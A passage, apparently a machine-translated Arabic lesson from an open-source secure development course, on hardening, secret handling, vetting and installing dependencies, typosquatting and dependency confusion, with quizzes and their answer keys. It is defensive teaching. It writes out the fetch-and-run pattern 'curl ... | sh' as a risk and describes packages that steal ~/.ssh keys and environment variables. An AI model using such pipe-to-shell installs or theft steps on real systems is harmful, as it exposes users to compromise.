تحدث العيوب! لكنها لا تحتاج إلى التحول إلى نقاط ضعف. بدلا من ذلك ، حاول تصميم نظامك بحيث يكون عيب واحد أقل احتمالا أن يؤدي إلى حل وسط كامل. هذا في الأساس تطبيق محدد لمبدأ الامتياز الأقل ، ولكن إذا فكرت على وجه التحديد في جعل النظام صعبا للتخريب *حتى* عندما يكون هناك عيب فيه ، فيمكنك تحديد خطوات أخرى يمكنك اتخاذها.

هناك العديد من الآليات التي يمكن أن تصلب النظام. تتضمن الأمثلة سياسة أمان المحتوى (CSP) والتوزيع العشوائي لتخطيط مساحة العنوان (ASLR). سنناقش بعض آليات التصلب لاحقا في الدورة. النقطة المهمة هنا هي أنه يجب عليك إما تمكين آليات التصلب أو التأكد من أن المستخدمين يمكنهم تمكينها.

#### حافظ على سرية الأسرار

إذا كان برنامجك يدير أسرارا مثل مفاتيح التشفير الخاصة وكلمات المرور ، فتأكد من بقائها سرية. وعلى وجه الخصوص:

* لا تضع أسرارا حية في شفرة المصدر الخاصة بك. تتم إدارة شفرة المصدر بواسطة أنظمة التحكم في الإصدار وغالبا ما تنتشر إلى عدد أكبر من الأشخاص والأنظمة مما تعتقد.

* قم بتخزين كلمات المرور المستخدمة للمصادقة الواردة باستخدام خوارزمية مصممة خصيصا للقيام بذلك. سنناقش هذه لاحقا في الدورة التدريبية ، ولكن هذه الأنواع من الخوارزميات تسمى خوارزميات *التجزئة المملحة المتكررة لكل مستخدم* (مثل argon2id أو bcrypt أو PBKDF2). إذا تم القيام به بشكل صحيح ، فمن غير الممكن للمهاجم تحديد العديد من كلمات المرور حتى إذا حصل المهاجم على بيانات كلمة المرور المشفرة.

* استخدم **https://** بدلا من **http://** ؛ التي توفر رابطا مشفرا لمنع تسرب البيانات.

* تجنب قبول وإرسال البيانات السرية (مثل المفاتيح الخاصة) كمعلمات سطر الأوامر ، حيث يمكنك ذلك ؛ غالبا ما تكون معلمات سطر الأوامر مرئية للعمليات الأخرى على النظام.


#### ثق فقط في القنوات الجديرة بالثقة

بشكل عام ، ثق فقط في المعلومات (المدخلات أو النتائج) من القنوات الجديرة بالثقة. على سبيل المثال، استخدم **https://** بدلا من **http://** عند الاتصال بخادم، لأنه يتيح التحقق مما إذا كان الخادم لديه شهادة تشفير صالحة لهذا الموقع. بشكل عام ، يجب عليك استخدام **https** ، لأن ذلك سيمنع المهاجمين من التطفل أو تعديل المعلومات المتبادلة مع مستخدمين آخرين.

#### فصل البيانات عن التحكم

خدعة مفيدة لتطوير برامج أكثر أمانا هي فصل البيانات عن التحكم (ويعرف أيضا باسم البرامج). بعبارة أخرى ، يجب عليك فصل البيانات السلبية عن البرامج التي يتم تنفيذها. بهذه الطريقة ، إذا تمكن أحد المهاجمين من إدخال معلومات "إضافية" في البيانات ، فلن يتسبب ذلك في تنفيذ برنامج يحتمل أن يكون ضارا. هذه في الأساس طريقة أخرى لتنفيذ أقل امتياز - لا تمنح البيانات الحق في التشغيل كبرنامج.

وخير مثال على ذلك هو سياسة أمان المحتوى (CSP) التي تدعمها متصفحات الويب الحديثة. يتيح لك CSP ذكر أن HTML الذي يتم إرساله هو بيانات ** فقط ، ولا  يسمح له بتوفير برامج نصية مضمنة (برامج) أو أنماط (والتي يمكن أن تكون أيضا برامج) - بدلا من ذلك ، قد يتم تنزيل البرامج النصية والأنماط فقط من أماكن موثوقة محددة. بهذه الطريقة ، إذا تمكن المهاجم من تخريب HTML ، فلن يتمكن المهاجم من التسبب في تشغيل البرامج التي يوفرها المهاجم.

 يعد التصميم غير الآمن خطأ شائعا في تطبيقات الويب لدرجة أنه 2021 OWASP Top 10 # 4.

#### اختبار 2.6: مبادئ التصميم الأخرى

\>\>أي مما يلي يعد مبدأ أمان إضافي مفيد؟|| تحقق من جميع الخيارات أدناه التي تعتبر مبادئ أمان مقبولة بشكل عام ، ولا تتحقق منها بخلاف ذلك.<<

[!x] تصميم وتنفيذ أنظمة للتأكد من أنه بعد الموافقة على الطلب ، لا يمكن للمهاجم تغيير شيء ذي صلة بهذا القرار قبل تنفيذ الطلب. {{ غير محدد: هذا مهم ، يطلق عليه شرط سباق وقت الفحص / وقت الاستخدام (TOCTOU). }}

[x] قم بتعديل تصميم النظام وتكوينه بحيث يكون الحل الوسط أقل احتمالا *حتى* لو كان هناك عيب. {{ غير محدد: هذا صحيح ، يطلق عليه "تصلب" النظام. }}

[ ] ضع كلمات المرور والمفاتيح السرية في شفرة المصدر ، بحيث يمكن للنظام الحصول على تلك المعلومات واستخدامها بسرعة دون الاعتماد على المكونات الخارجية أو مخازن البيانات. {{ محدد: لا، من فضلك لا ** تفعل ذلك. يجب ألا تكون كلمات المرور والمفاتيح السرية في شفرة المصدر. إذا لم تكن في شفرة المصدر ، فلن يحصل الأشخاص الذين يمكنهم رؤية شفرة المصدر على المعلومات السرية ، كما أن إبعادهم عن شفرة المصدر يجعل تغيير كلمات المرور والمفاتيح أسهل. }}

[ ] قم بتضمين التحكم (بما في ذلك البرامج) مع البيانات ، بحيث يتم توفير كيفية معالجة البيانات بسهولة مع الكود. {{ محدد: يمكن أن يكون ذلك مفيدا ، ولكنه خطير أيضا من وجهة نظر أمنية. إذا تمكن أحد المهاجمين من إدخال معلومات "إضافية" في البيانات ، فإن هذا التصميم يمكن أن يجعل من السهل التسبب في تنفيذ برنامج يحتمل أن يكون ضارا. في بعض الأحيان يكون من المهم القيام بذلك على أي حال ، لكنه يخلق المزيد من التعقيدات عند تطوير برامج آمنة. }}

# إعادة استخدام البرامج الخارجية

يصف هذا الفصل كيفية إعادة استخدام البرامج مع وضع الأمان في الاعتبار، بما في ذلك تحديد هذه البرامج وتنزيلها وتثبيتها وتحديثها.

أهداف التعلم:

1. ناقش التأثير الحيوي للبرامج الخارجية على الأمان.

2. ناقش كيفية مراعاة الأمان عند اختيار البرنامج.

3. ناقش كيفية مراعاة الأمان عند تنزيل البرامج وتثبيتها.

4. ناقش أهمية تحديث البرامج المعاد استخدامها.

5. ناقش أهمية تجنب / استبدال استخدام الواجهات القديمة.

## سلسلة التوريد

### أساسيات إعادة استخدام البرامج

عند تطوير البرامج ، عادة ما تعيد استخدام الكثير من البرامج الأخرى. قد يشمل ذلك نظام تشغيل ووقت تشغيل حاوية وأطر عمل ومكتبات وملحقات ومكونات إضافية وسمات وما إلى ذلك. ستستخدم عادة أيضا أدوات التطوير التي طورها الآخرون. يمكن أن يؤثر هذا البرنامج المعاد استخدامه ، وكيفية الحصول عليه ، بشكل كبير على أمان النتيجة.

![تبعية](dependency.png)

*التبعية* (تم استردادها من [xkcd.com](https://xkcd.com/2347/) ، مرخصة بموجب [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/))

يعتبر البعض اختيار البرامج المعاد استخدامها جزءا من التصميم ، لأنه يؤثر بوضوح على كيفية تقسيم المشكلة. قد يصف آخرون هذا بأنه فئة خاصة به ، على سبيل المثال ، سلسلة التوريد. بغض النظر عن ما تسميه ، فمن المهم. بشكل عام ، أنظمة البرمجيات اليوم هي في الغالب برامج معاد استخدامها من مكان آخر.

إذا كنت تشتري برنامجا باهظ الثمن اخترته نيابة عن مؤسسة ، فغالبا ما يكون هناك العديد من الخطوات والعمليات التي يجب العمل من خلالها ، والتي تركز بشكل أساسي على التحكم في الأموال. هذا خارج نطاق هذه الدورة. بدلا من ذلك ، سنركز على الجوانب المحددة المتعلقة بالأمن.

تدعم العديد من الأنظمة تثبيت الملحقات التي يتم تطويرها وصيانتها بشكل منفصل عن البرنامج "الأساسي" (غالبا بواسطة مطورين مختلفين). *** يجب تقييم الإضافات بشكل منفصل قبل تثبيتها***. قد يكون النظام الأساسي آمنا نسبيا ، لكن هذا لا يعني أن جميع امتداداته آمنة ، وغالبا ما تكون أكبر المخاطر من الامتدادات. قد تسمى هذه الملحقات العديد من الأسماء بما في ذلك الملحقات أو المكونات الإضافية أو الوظائف الإضافية أو السمات أو المكونات أو الحزم. بغض النظر عن تسميتها ، قم بتقييمها أيضا. على سبيل المثال ، ذكرت PatchStack أنه بينما قام WordPress بتشغيل 43.2٪ من مواقع الويب على الويب في عام 2021 ، "تظل نقاط الضعف من المكونات الإضافية والسمات واحدة من أكبر التهديدات لمواقع الويب المبنية على WordPress". وأشاروا إلى أن 0.58٪ فقط من الثغرات الأمنية تنشأ من نواة WordPress في عام 2021 ؛ كانت بقية نقاط الضعف في المكونات (المكونات الإضافية والسمات). والأسوأ من ذلك ، أن 29٪ من مكونات WordPress الإضافية ذات الثغرات الأمنية الحرجة لم تتلق أي تصحيح. لن يكون هذا مهما كثيرا إذا كان عدد قليل من المواقع يستخدم المكونات ، ولكن في المتوسط يحتوي موقع WordPress على 18 مكونا مختلفا (المكونات الإضافية والسمات) مثبتة. راجع [*حالة أمان WordPress في عام 2021*](https://patchstack.com/whitepaper/the-state-of-wordpress-security-in-2021/) بواسطة PatchStack لمزيد من المعلومات.

نستخدم مصطلح "البرامج المعاد استخدامها" هنا ، لأن هذا هو مصدر قلقنا. يتضمن هذا البرنامج المعاد استخدامه جميع البرامج التي تعتمد عليها عند تشغيل البرنامج ، ويعرف أيضا باسم تبعياته.

عادة ما تكون الغالبية العظمى من البرامج التي تعيد استخدامها عبارة عن برامج مفتوحة المصدر (OSS). لذلك دعونا نركز على نصائح حول كيفية تقييم برمجيات المصدر المفتوح قبل إعادة استخدامها. ستنطبق بعض هذه النصائح أيضا على البرامج مغلقة المصدر.

### اختيار (تقييم) البرمجيات مفتوحة المصدر

هناك العديد من الأشياء المهمة التي يجب مراعاتها عند اختيار البرامج مفتوحة المصدر.

طورت مؤسسة أمان المصدر المفتوح (OpenSSF) [*دليلا موجزا لتقييم البرامج مفتوحة المصدر*](https://github.com/ossf/wg-best-practices-os-developers/blob/main/docs/Concise-Guide-for-Evaluating-Open-Source-Software.md#readme) التي يمكن أن تساعد. يقترحون أنه "بصفتك مطور برامج ، قبل استخدام تبعيات أو أدوات البرامج مفتوحة المصدر (OSS) ، حدد المرشحين وقم بتقييم المرشحين الرائدين مقابل احتياجاتك. لتقييم الاعتماد المحتمل على برمجيات المصدر المفتوح من أجل الأمن والاستدامة ، ضع في اعتبارك هذه الأسئلة ..."

يقترح إصدار 2022-09-01 الأسئلة التالية ، إلى جانب كيفية الحصول على معلومات للمساعدة في الإجابة عليها:

1. **هل يمكنك تجنب إضافته؟**  هل يمكنك استخدام تبعية موجودة (ربما غير مباشرة) بدلا من ذلك؟ كل تبعية جديدة تزيد من سطح الهجوم (قد يؤدي تخريب التبعية الجديدة ، أو تبعياتها المتعدية ، إلى تخريب النظام).
2. **هل تقوم بتقييم النسخة المقصودة؟**  تأكد من أنك تقوم بتقييم الإصدار المقصود من البرنامج ، وليس شوكة شخصية أو شوكة يتحكم فيها المهاجم. تساعد هذه التقنيات في مواجهة هجوم "الأخطاء المطبعية" الشائع (حيث ينشئ المهاجم اسما "صحيحا تقريبا").
    1. تحقق من اسمها وموقع المشروع للحصول على الرابط.
    2. تحقق من علاقة الشوكة على GitHub / GitLab.
    3. تحقق مما إذا كان المشروع تابعا لمؤسسة (في هذه الحالة ، يجب أن تكون قادرا على الوصول إلى المصدر الرسمي من موقع المؤسسة).
    4. تحقق من وقت إنشائها ، وتحقق من شعبيتها.
3. **هل يتم الحفاظ عليها؟**  البرامج التي لا تتم صيانتها هي مخاطرة ؛ معظم البرامج تحتاج إلى صيانة مستمرة. إذا لم تتم صيانته ، فمن المحتمل أيضا أن يكون غير آمن.
    1. هل حدث نشاط كبير مؤخرا (مثل الالتزامات) خلال العام الماضي؟
    2. متى كان آخر إصدار له (هل كان قبل أقل من عام)؟
    3. هل هناك أكثر من مشرف واحد ، من الناحية المثالية من منظمات مختلفة؟
    4. هل هناك إصدارات أو إعلانات حديثة من المشرف (المشرفين) عليها؟
    5. هل تشير سلسلة الإصدار الخاصة به إلى عدم الاستقرار (على سبيل المثال ، ابدأ ب "0" ، بما في ذلك "alpha" أو "beta" ، وما إلى ذلك)
4. **هل هناك دليل على أن مطوريها يعملون على جعلها آمنة؟**
    1. حدد ما إذا كان المشروع قد حصل (أو في طريقه إلى)  شارة [أفضل الممارسات لمؤسسة أمان المصدر المفتوح (OpenSSF).](https://bestpractices.coreinfrastructure.org/)
    2. افحص المعلومات المتعلقة [https://deps.dev](https://deps.dev/) ، بما في ذلك [ نقاط أداء OpenSSF](https://github.com/ossf/scorecard) وأي ثغرات أمنية معروفة.
    3. تحديد ما إذا كانت تبعيات الحزمة محدثة (نسبيا).
    4. حدد ما إذا كانت هناك وثائق تشرح سبب أمانها (ويعرف أيضا باسم "حالة الضمان").
    5. هل هناك اختبارات آلية مدرجة في خط أنابيب CI الخاص بها؟ ما هي تغطية الاختبار؟
    6. هل يقوم المشروع بإصلاح الأخطاء (خاصة الأخطاء الأمنية) في الوقت المناسب؟ هل يصدرون إصلاحات أمان للإصدارات الأقدم؟ هل لديهم إصدار LTS (دعم طويل الأمد)؟
    7. هل يستخدم المطورون ميزات أمان استضافة التعليمات البرمجية عند الاقتضاء (على سبيل المثال ، إذا كانوا يستخدمون GitHub أو GitLab ، فهل يستخدمون حماية الفرع)؟
    8. تحديد عمليات تدقيق الأمان وما إذا كان قد تم إصلاح أي مشاكل تم العثور عليها. عمليات تدقيق الأمان غير شائعة نسبيا ، ولكن راجع "مراجعات الأمان" الخاصة ب OpenSSF[](https://github.com/ossf/security-reviews).
    9. استخدم [مبادئ دليل SAFECode _لتقييم ضمان البرامج_](https://safecode.org/resource-managing-software-security/principles-of-software-assurance-assessment/) (2019) ، وهو نهج متعدد المستويات لفحص أمان البرنامج.
    10. كيف يتم أداؤهم وفقا للدليل [ المرجعي لضمان الأمان ](https://www.openchainproject.org/)OpenChain (يتوفر [دليل أغسطس 2021](https://www.openchainproject.org/security-guide) والمسودة [الأحدث](https://github.com/OpenChain-Project/SecurityAssuranceGuide/tree/main/Guide/2.0))؟
    11. هل يطبقون العديد من الممارسات في [الدليل الموجز لتطوير برامج أكثر أمانا](https://github.com/ossf/wg-best-practices-os-developers/blob/main/docs/Concise-Guide-for-Evaluating-Open-Source-Software.md#readme)؟
5. **هل هو سهل الاستخدام بشكل آمن؟**

    1. هل التكوين الافتراضي و "الأمثلة البسيطة" آمنان (على سبيل المثال ، التشفير قيد التشغيل افتراضيا في بروتوكولات الشبكة)؟ إذا لم يكن كذلك ، تجنب ذلك.
    2. هل تم تصميم الواجهة / واجهة برمجة التطبيقات الخاصة به لتكون سهلة الاستخدام بشكل آمن (على سبيل المثال ، إذا كانت الواجهة تنفذ لغة ، فهل تدعم الاستعلامات ذات المعلمات)؟
    3. هل هناك إرشادات حول كيفية استخدامها بشكل آمن؟

6. **هل هناك تعليمات حول كيفية الإبلاغ عن نقاط الضعف؟ ** انظر [دليل تنفيذ عملية منسقة للكشف عن نقاط الضعف لمشاريع المصدر المفتوح](https://github.com/ossf/oss-vulnerability-guide/blob/main/guide.md) للحصول على إرشادات لمشاريع برمجيات المصدر المفتوح.
7. **هل لها فائدة كبيرة؟ ** قد تكون البرامج التي تضم العديد من المستخدمين أو المستخدمين الكبار غير مناسبة لاستخدامك. ومع ذلك ، من المرجح أن تقدم البرامج المستخدمة على نطاق واسع معلومات مفيدة حول كيفية استخدامها بشكل آمن ، وسيهتم المزيد من الأشخاص بأمنها. تحقق مما إذا كان الاسم المشابه أكثر شيوعا - فقد يشير ذلك إلى هجوم مطبعي.
8. **ما هو ترخيص البرنامج؟**  التراخيص ليست أمنية من الناحية الفنية ، ولكن يمكن أن يكون للتراخيص تأثير كبير على الأمن والاستدامة. تأكد من أن كل مكون لديه  ترخيص ، وأنه [ترخيص OSI](https://opensource.org/licenses) مستخدم على نطاق واسع  إذا كان OSS ، وأنه يتوافق مع الاستخدام المقصود. من غير المرجح أن تتبع المشاريع التي لن توفر معلومات ترخيص واضحة الممارسات الجيدة الأخرى التي تؤدي إلى تأمين البرامج.
9. **ما هو تقييمك لرمزها؟ ** حتى مراجعة موجزة لشفرة مصدر البرنامج ، وتغييراتها بمرور الوقت ، يمكن أن تمنحك بعض البصيرة. فيما يلي أشياء يجب وضعها في الاعتبار:
    1. عند مراجعة شفرة المصدر الخاصة به ، هل هناك دليل في الكود على أن المطورين كانوا يحاولون تطوير برامج آمنة (مثل التحقق الصارم من صحة المدخلات غير الموثوق بها واستخدام عبارات ذات معلمات)؟
    2. هل هناك دليل على وجود برامج غير آمنة / غير مكتملة (على سبيل المثال ، العديد من بيانات TODO)؟
    3. ما هي المشاكل "العلوية" التي أبلغت عنها أدوات التحليل الثابتة؟
    4. هل هناك دليل على أن البرنامج ضار؟ لكل [_مجموعة سكين Backstaber ، _](https://arxiv.org/abs/2005.09535)تحقق من البرامج النصية / إجراءات التثبيت بحثا عن الخبث ، وتحقق من استخراج البيانات من  ~/.**ssh** ومتغيرات البيئة ، وابحث عن القيم المشفرة / المبهمة التي يتم تنفيذها. افحص أحدث عمليات التنفيذ للتعليمات البرمجية المشبوهة (ربما أضافها أحد المهاجمين مؤخرا).
    5. ضع في اعتبارك تشغيل البرنامج في وضع الحماية لمحاولة تشغيل التعليمات البرمجية الضارة واكتشافها.
    6. ضع في اعتبارك تشغيل جميع حالات الاختبار المحددة لضمان اجتياز البرنامج لها.

تشمل الموارد الأخرى التي قد ترغب في وضعها في الاعتبار ما يلي:

1. [دليل Tidelift لاختيار الحزم جيدا (فبراير 2021) ](https://tidelift.com/subscription/choosing-open-source-packages-well)، Tidelift
2. [كيفية تقييم البرمجيات مفتوحة المصدر / البرمجيات الحرة (OSS / FS)](https://dwheeler.com/oss_fs_eval.html)

هناك العديد من الأماكن التي يمكن العثور فيها على بعض هذه المعلومات (بخلاف مجرد استخدام محرك بحث). وهي تشمل الصفحة الرئيسية للمشاريع و / أو مستودع التعليمات البرمجية المصدر ، والصفحة الرئيسية لمستودع الحزمة الافتراضي للنظام البيئي  ، و deps.dev ، و [metrics.openssf.org](https://deps.dev/) ، و libraries.io[ ، و Synopsys Black Duck ](https://metrics.openssf.org/)OpenHub[ ](https://libraries.io/)، [و Linux Foundation ](https://www.openhub.net/)LFX.[](https://lfx.linuxfoundation.org/)

تنطبق معظم هذه الأسئلة أيضا على البرامج مغلقة المصدر التي يتم إعادة استخدامها.

تعتمد معظم البرامج على برامج أخرى ، والتي بدورها تعتمد غالبا على برامج أخرى ذات طبقات عديدة. قائمة مواد البرامج (SBOM) هي مخزون متداخل يحدد مكونات البرنامج التي تشكل جزءا أكبر من البرنامج. العديد من النظم الإيكولوجية لها تنسيقات SBOM خاصة بالنظام البيئي. هناك أيضا بعض تنسيقات SBOM التي تدعم النظم البيئية التعسفية: [تبادل بيانات حزمة البرامج (SPDX) ](https://spdx.dev/)ومعرف [البرنامج (SWID)](https://csrc.nist.gov/Projects/Software-Identification-SWID/) و [CycloneDX](https://github.com/CycloneDX/specification). عندما يتوفر SBOM لمكون تفكر في استخدامه ، غالبا ما يكون من الأسهل استخدام هذه البيانات للمساعدة في الإجابة على بعض الأسئلة المذكورة أعلاه. من الجيد أيضا توفير SBOM للمستخدمين المحتملين لبرنامجك ، لنفس الأسباب.

>  وقت القصة: Typosquatting بواسطة jeIlyfish و python3-dateutil

> في 2019-12-01 اكتشف مطور البرامج الألماني لوكاس مارتيني أن مكتبتين من مكتبات Python في مستودع PyPI (Python Package Index) الشهير نفذتا هجمات مطبعية. ستسرق هذه الحزم الضارة مفاتيح SSH و GPG الخاصة من المطورين الذين استخدموها. `jeIlyfish` قلدت `jellyfish` الحزمة الضارة الحزمة غير الضارة  وأحدثت الضرر (لاحظ أنه في اسم الحزمة الضارة ، يكون الحرف الثالث عبارة عن حرف كبير`I` "" ، وليس حرفا صغيرا "`l`"). قام نفس المهاجم أيضا بتحميل حزمة ضارة تسمى `python3-dateutil` تقليد المكتبة الشهيرة `dateutil` ل Python3. `python3-dateutil` لم تتضمن الحزمة الضارة أي تعليمات برمجية ضارة بحد ذاتها ، ولكن بدلا من ذلك قامت بتحميل الحزمة الضارة `jeIlyfish` كتبعية.  كانت الحزمة الضارة `python3-dateutil` موجودة على PyPI لمدة يومين فقط ، لكن الحزمة الضارة `jeIlyfish` كانت متاحة منذ ما يقرب من عام. تمت إزالة كلتا المكتبتين بواسطة PyPI في اليوم الذي تم فيه إخطار PyPI ("[تم اكتشاف مكتبتين ضارتين من Python تسرقان مفاتيح SSH و GPG" بواسطة Catalin Cimpanu ، ZDNet ، 2019](https://www.zdnet.com/article/two-malicious-python-libraries-removed-from-pypi/)).

#### اختبار 3.1: اختيار (تقييم) البرمجيات مفتوحة المصدر

\>\>ما هو الدليل على أن البرنامج الذي تفكر في إعادة استخدامه سيكون على الأرجح خيارا جيدا للأمان؟ حدد جميع الإجابات التي تنطبق.<<

[!x] دليل على أنه سهل الاستخدام بشكل آمن

[x] مشروع برمجيات المصدر المفتوح الذي حصل على شارة OpenSSF لأفضل الممارسات

[x] مشروع برمجيات المصدر المفتوح مع العديد من المساهمين النشطين خلال العام الماضي

[ ] البرنامج ليس لديه بيان ترخيص

### تنزيل وتثبيت البرامج القابلة لإعادة الاستخدام

بالطبع ، إذا قمت بتنزيل وتثبيت نسخة مخربة من البرنامج المعاد استخدامه ، فقد تكون هذه مشكلة خطيرة. لذا تأكد من حصولك على  الإصدار *الصحيح* من البرنامج:

1. تأكد من أن لديك الاسم الصحيح بالضبط. يسمى الهجوم الشائع "الأخطاء المطبعية". في الأخطاء المطبعية ، سيقوم المهاجم بإنشاء اسم حزمة أو اسم مجال مشابه عن قصد وبشكل ضار لمكون برنامج مستخدم على نطاق واسع ، واستخدام هذا الاسم المضلل لنشر إصدار ضار من هذا البرنامج. [وجد Ohm &ampall ، 2020](https://arxiv.org/abs/2005.09535) أن *"معظم الحزم الضارة [OSS] تحاكي أسماء الحزم الحالية عن طريق الأخطاء المطبعية".* على سبيل المثال:

    1. تحقق من التغييرات الشائعة في الأسماء المضللة. من السهل التبديل بين الشرطة (**-**) والشرطة السفلية (**&#95; **). يبدو الحرف الواحد** (1**) والأحرف الصغيرة L (**l) **متشابهين ، كما هو الحال مع الصفر** (0**) والحرف الكبير O (O****). في بعض مديري الحزم ، تعتبر الأحرف الكبيرة والصغيرة ASCII مختلفة ؛ في هذه الحالات ، احذر من الحالة. يوفر Unicode أحرف تظهر تماما مثل ASCII ، ولكنها أبجدية أخرى ، مثل السيريلية أو اليونانية ؛ في بعض الحالات ، يمكن أيضا استغلالها.

    2. تحقق من مدى شعبية الحزمة. بشكل عام ، الإصدار الأكثر شيوعا هو الإصدار الصحيح. بالنسبة للحزم، قارن عدد مرات التنزيل للحزم ذات الأسماء المتشابهة. قد تكون تلك التي تحتوي على عدد أقل هجمات مطبعية. ضع في اعتبارك استخدام محرك بحث لتحديد الحزمة أو المجال الأكثر شيوعا. ومع ذلك ، تأكد من *تجاهل* جميع النطاقات المعلن عنها من محرك البحث ؛ قد يدفع المهاجمون للإعلان عن نسختهم الضارة!

    3. تحقق من تاريخ إصدار الحزمة. الأقدم هو الذي تريده غالبا.

2. تأكد من تنزيل البرنامج وتثبيته بطريقة جديرة بالثقة:

    1. يجب عليك تنزيل البرنامج مباشرة من موقعه الرئيسي أو من موقع إعادة التوزيع الذي لديك سبب وجيه للثقة به (مثل مستودع توزيع Linux أو المستودع القياسي لمدير حزم لغة البرمجة).

    2. عادة ما يعني هذا أنه يجب عليك استخدام **https**:  (TLS) لتنزيل  البرنامج ، وليس **http:** ، لأن هذا يضمن بشكل عام أنك تتصل بالموقع الذي طلبته ويمنع المهاجمين من تعديل البرنامج في طريقه إليك.

    3. ضع في اعتبارك تنزيل البرنامج ، ولكن بعد ذلك قم بتثبيته واستخدامه بعد بضعة أيام فقط بعد التحقق من عدم تغيير أي شيء. بهذه الطريقة ، إذا تم تخريب موقع التوزيع مؤقتا عند تنزيل البرنامج ، ولكن تم إصلاحه بسرعة ، فلن تستخدم الإصدار الذي تم تخريبه. هذا ليس عمليا دائما ، حيث قد تكون في عجلة من أمرك للانتظار ، ولكن في بعض الحالات يكون من السهل القيام بذلك.

    4. حاول تجنب استخدام الأنابيب إلى الغلاف (مثل  **curl ... | sh**) لتنزيل البرامج وتثبيتها. من الواضح أنه لا يمكنك تنزيل التثبيت وتأخيره عند استخدام أنبوب إلى غلاف. بالإضافة إلى ذلك ، يمكن للمهاجمين الذين يقومون بتخريب موقع المصدر اكتشاف طلب من أنبوب إلى غلاف وتخريب المستخدمين من أنبوب إلى shell بشكل انتقائي ، والذين بحكم تعريفهم لا يراجعون ما يقومون بتنزيله (انظر ["الكشف عن استخدام" curl | باش "جانب الخادم").](https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/) إن استخدام الأنابيب إلى الغلاف يجعل من الصعب اكتشاف عمليات التخريب لموقع المصدر ومواجهتها. كما أنه يجعل من الصعب تحديد فهم الإصدار الفعلي الذي قمت بتنزيله وتثبيته بشكل موثوق - لذلك فقدت بعض التحكم في الإصدار بشكل فعال ، ولا يمكنك الاعتماد على الآخرين لتتمكن من تحديد ما حدث. نعم ، يمكن للبرنامج المثبت الإبلاغ عن إصدار ، ولكن يمكن للبرامج الإبلاغ عن أي رقم ويمكنها الإبلاغ عن نفس الرقم لإصدارات فعلية مختلفة. باختصار ، تزداد مخاطرك إذا كنت تستخدم أنبوب إلى قشرة.

        ومع ذلك ، إذا كنت تستخدم فقط من أنبوب إلى غلاف في بيئة مضمنة (على سبيل المثال ، حاوية أو جهاز افتراضي بامتيازات محدودة) والتخلص من أي ملفات تنفيذية منتجة ، كما يحدث غالبا في بيئات الاختبار لخطوط أنابيب التكامل المستمر (CI) ، فإن الأنبوب إلى الغلاف يكون أقل خطورة بكثير. من الصعب أيضا تجنب الأنابيب إلى الغلاف في بعض المواقف ، اعتمادا على كيفية توزيع البرنامج المعاد استخدامه ، وأحيانا لا يستحق الأمر محاولة تجنب الأنبوب إلى الغلاف. إذن هذه نصيحة تستحق التفكير ، ولكنها لا تستحق القيام بها دائما. **تذكر**: ركز على إدارة المخاطر ، وليس تجنب المخاطر الكاملة.

    5. حيثما كان ذلك مهما وعمليا ، حاول التحقق من أن الحزمة موقعة رقميا من قبل منشئيها المتوقعين (أو على الأقل موزعيها). برنامج للتحقق من أن الحزمة موقعة رقميا ، وتسمى أيضا موقعة بشكل مشفر ، موجودة منذ عقود. في بعض الحالات ، هناك تحقق آلي من أن الحزمة تأتي من موزع معين. ومع ذلك ، غالبا ما يكون من الصعب التأكد من أن لديك المفاتيح العامة الصحيحة المقابلة (هذا مثال على  مشكلة *إدارة المفاتيح*.) هناك عمل مستمر في هذا المجال ، على سبيل المثال ،  يعمل مشروع [sigstore](https://www.sigstore.dev/) على تسهيل التوقيع الرقمي والتحقق من القطع الأثرية للبرامج.  عندما يمكنك عمليا إنشاء التوقيعات الرقمية والتحقق منها ، استفد منها.

    6. احذر من الاعتماد على القدرة على تنزيل المكونات وتثبيتها في وقت التشغيل من مواقع أخرى (خارجية). هذه ممارسة واسعة الانتشار للعديد من تطبيقات الويب ، خاصة بالنسبة لمكوناتها من جانب العميل مثل مكونات JavaScript وخطوط الويب. ومع ذلك ، فإن الخطر يكمن في أنه إذا أصبح هذا الموقع غير متاح (بسبب الهجوم أو ببساطة لأن المورد قرر التوقف عن دعمه) ، فسيصبح نظامك غير متاح. قد يكون المورد مؤسسة كبيرة ، لكنهم قد يختارون التوقف عن دعم ما تعتمد عليه. قبل الاعتماد على شيء ما في وقت التشغيل لا يتعين عليك القيام به ، تحقق على الأقل لتحديد الموثوقية المستقبلية لتلك الخدمة ، واستخدم خدمة موثوقة مثل شبكة توزيع محتوى معروفة (CDN).

تحتاج أيضا إلى التأكد من أن نظامك ليس عرضة ل "ارتباك التبعية" المعروف أيضا باسم هجوم "الاستبدال". تؤثر هذه الثغرة الأمنية على الأنظمة التي تحدد قائمة من التبعيات ويتم تكوينها لاسترداد تلك التبعيات من أكثر من مستودع واحد. غالبا ما يتم تكوين هذه الأنظمة للاعتماد على بعض الحزم P حيث افترض المطورون أن الحزمة P سيتم استرجاعها من مستودع معين (عادة ما يكون مستودعا خاصا). تحدث الثغرة الأمنية إذا لم يتطلب أي شيء ** استرداد الحزمة P من مستودعها المتوقع. إذا لم يتطلب أي شيء ذلك ، يمكن للمهاجم إنشاء حزمة ضارة P بنفس الاسم على  مستودع *مختلف* (عادة ما يكون مستودعا عاما) ، وخداع النظام لاستخدام هذه الحزمة الضارة بدلا من ذلك. يمكن للمهاجمين اتخاذ العديد من الخطوات لجعل استخدامه محتملا ، مثل إعطاء نسختهم الضارة رقم إصدار كبير. هذا ليس هجوما نظريا. بدأ المهاجمون في استغلال هذه الثغرة الأمنية على نطاق واسع في عام 2021. (لمزيد من المعلومات، راجع " [3 طرق للتخفيف من المخاطر عند استخدام خلاصات الحزم الخاصة" من](https://azure.microsoft.com/en-us/resources/3-ways-to-mitigate-risk-using-private-package-feeds/) Microsoft و "ارتباك التبعية: كيف اخترقت Apple و Microsoft وعشرات الشركات الأخرى[" ](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)بقلم Alex Birsan.) هناك العديد من التدابير المضادة لارتباك التبعية ، على سبيل المثال:

1. استخدم خلاصة واحدة (على سبيل المثال، مستودع أو سجل واحد). إذا كان هناك مصدر واحد ، فلا توجد فرصة للارتباك.
2. أعلن بوضوح ، لكل حزمة ، حيث يجب استرداد الحزمة من. وتسمى هذه أحيانا "النطاقات الخاضعة للرقابة".
